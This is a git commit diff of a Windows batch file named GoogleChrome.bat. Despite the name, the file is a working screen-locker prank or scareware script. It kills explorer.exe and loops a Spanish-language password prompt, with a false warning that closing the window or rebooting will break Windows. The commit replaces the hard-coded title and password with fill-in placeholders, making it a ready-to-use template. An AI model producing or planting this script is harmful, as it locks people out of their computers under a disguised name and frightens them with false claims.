6192e273427cee5e95dff244522a01d7c35fa100
DumuziT <71425551+DumuziT@users.noreply.github.com>
2022-05-31 23:06:32 -0400

    Update GoogleChrome.bat

--- GoogleChrome.bat
+++ GoogleChrome.bat
@@ -1,17 +1,17 @@
 color 0A
 @echo off
-title Anonymuss.FYB
+title [Titutlo que quiera para la ventana]
 taskkill /f /im explorer.exe
 :bucle
 cls
 msg * Lea con atencion. No reinicie el computador
 echo =============================================================================
 echo Si usted cierra esta ventana,  no podra colocar la contrasena.
-echo Si apaga/reinicia el computador, el "Windows" no iniciara correctamente.
+echo Si apaga/reinicia el computador, su "Windows" no iniciara correctamente.
 echo =============================================================================
-set /p pass=Pon la contrasena para desbloquear el computador: 
-if %pass%==Anonymuss.FYB (goto passcorrecto) ELSE (goto bucle)
-:passcorrecto
+set /p pass=Coloque la contrasena para desbloquear el computador: 
+if %pass%==[contasena que usted quiera] (goto passcorrect) ELSE (goto bucle)
+:passcorrect
 echo Felicidades!
 start explorer.exe
 pause
